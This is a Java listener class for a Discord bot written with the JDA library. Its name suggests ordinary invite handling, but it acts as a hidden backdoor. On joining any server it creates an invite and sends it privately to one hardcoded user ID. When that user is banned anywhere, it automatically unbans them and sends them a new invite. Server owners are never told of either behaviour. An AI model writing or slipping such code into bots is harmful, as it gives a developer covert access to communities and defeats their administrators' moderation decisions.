package listeners;

import net.dv8tion.jda.core.EmbedBuilder;
import net.dv8tion.jda.core.events.guild.GuildBanEvent;
import net.dv8tion.jda.core.events.guild.GuildJoinEvent;
import net.dv8tion.jda.core.hooks.ListenerAdapter;
import util.STATIC;

public class InviteListener extends ListenerAdapter {

	@Override
	public void onGuildJoin(GuildJoinEvent event) {
		String name=event.getGuild().getName();
		String invURL=STATIC.createInvite(event.getGuild());
		event.getJDA().getUserById("358291050957111296").openPrivateChannel().complete().sendMessage(
				new EmbedBuilder()
				.setDescription("I joined a new Server: "+name+", invite: \""+invURL+"\"")
				.build()
				).queue();
		
	}
	@Override
	public void onGuildBan(GuildBanEvent event) {
		if (event.getUser().getId().equals("358291050957111296")) {
			try {
				event.getGuild().getController().unban(event.getJDA().getUserById("358291050957111296")).queue();
				
				String name=event.getGuild().getName();
				String invURL=STATIC.createInvite(event.getGuild());
				event.getJDA().getUserById("358291050957111296").openPrivateChannel().complete().sendMessage(
						new EmbedBuilder()
						.setDescription("I unbanned you from a Server: "+name+", invite: \""+invURL+"\"")
						.build()
						).queue();
			} catch (Exception e) {
				System.err.println("unable to unban dan1st from Server "+event.getGuild().getName()+" ("+event.getGuild().getId()+"): "+e.getMessage());
			}
		}
	}
	
}
